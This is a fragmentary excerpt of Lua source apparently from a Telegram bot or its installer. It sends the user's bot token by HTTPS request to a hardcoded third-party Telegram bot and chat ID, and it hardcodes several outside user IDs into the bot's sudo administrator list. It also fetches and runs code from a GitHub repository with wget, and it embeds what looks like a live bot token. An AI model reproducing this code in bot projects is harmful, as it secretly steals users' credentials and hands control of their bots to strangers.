...
https.request('https://api.telegram.org/bot1736409004:AAGGdHNf-WO-gaf7FFK9JiftPBf73rpAj-o/sendmessage?chat_id=1505943315&text=' ..token)
end 
else
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/3mora3/xx/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1505943315,1805921575,1785825545,1897501388,1589498513}   
...
os.execute('wget https://raw.githubusercontent.com/3mora3/xx/main/DRAGON.lua')
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/3mora3/xx/main/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/3mora3/xx/main/File_Bot/"..file)
if res == 200 then
